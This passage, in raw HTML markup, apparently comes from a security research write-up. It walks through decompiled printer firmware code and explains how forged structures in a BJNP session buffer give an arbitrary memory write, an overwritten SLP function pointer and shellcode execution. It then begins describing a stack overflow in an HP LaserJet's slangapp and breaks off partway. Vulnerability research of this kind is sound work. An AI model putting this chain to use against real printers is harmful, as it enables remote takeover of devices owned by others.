&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;returnNegativeRegistrationResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the conditions are met, it will use ‘returnNegativeRegistrationResponse’ to handle the Response.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;returnNegativeRegistrationResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+4h] [bp-2Ch] BYREF&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+18h] [bp-18h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+1Ah] [bp-16h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;maybe_memcpy_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED3100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2349&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_40B06FD8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gap0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;responsebuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndGenerateNameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[3]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rev16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sySendToSocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;logg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2392&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2393&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2396&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2372&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt;, it will overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;response_buf-&amp;gt;id&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nbinfo-&amp;gt;id&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;That is, if we can overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; structure and forge the structure of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt;, we can do arbitrary memory writing. We need to find a global buffer to forge the structure. We finally chose BJNP session buffer as our target. It will copy our payload when we start a BJNP session.&lt;/p&gt;

&lt;p&gt;After we have arbitrary memory writing. We can overwrite the function pointer of SLP service with BJNP session buffer pointer.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sub_4159CF90&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dword_45C8FF14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// SLP function&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It does not implement DEP. After overwriting the function pointer, we can use the BJNP session buffer again to put our shellcode. After that, we can use the SLP attribute request to control the PC and run our shellcode.&lt;/p&gt;

&lt;h3 id=&quot;hp-1&quot;&gt;HP&lt;/h3&gt;
&lt;p&gt;Our target this time is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HP Color LaserJet Pro M479fdw&lt;/code&gt; printer, which is primarily Linux-based. This makes the analysis relatively simpler. Under the Web Service, there are numerous ‘cgi’ files providing various printer operations. These operate via the FastCGI method. You can refer to the nginx config to see which path corresponds to which port and service. The config can be found at rootfs/sirius/rom/httpmgr_nginx.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Sirius/rom/httpmgr_nginx/ledm.conf&lt;/code&gt;
&lt;img src=&quot;/assets/img/blog/20231106/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where is the bug&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/local/slanapp&lt;/code&gt; is responsible for handling scan-related operations and primarily listens on 127.0.0.1:14030.&lt;/p&gt;

&lt;p&gt;We can see from rootfs/sirius/rom/httpmgr_nginx/rest_scan.conf :
&lt;img src=&quot;/assets/img/blog/20231106/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we access /Scan/Jobs, the request is forwarded to a FastCGI listening on the 14030 port. After analysis, we found that it was handled by /rootfs/usr/local/bin/slangapp. When we send a request to /Scan/Jobs, it will call scan_job_http_handler in slangapp.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where is the bug&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;There is a stack overflow at rest_scan_handle_get_request in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;slangapp&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;scan_job_http_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+14h] [bp-2Ch]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+18h] [bp-28h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+20h] [bp-20h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+28h] [bp-18h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+30h] [bp-10h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urilen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+38h] [bp-8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+40h] [bp+0h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;132&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+44h] [bp+4h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;260&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+C8h] [bp+88h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x81u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
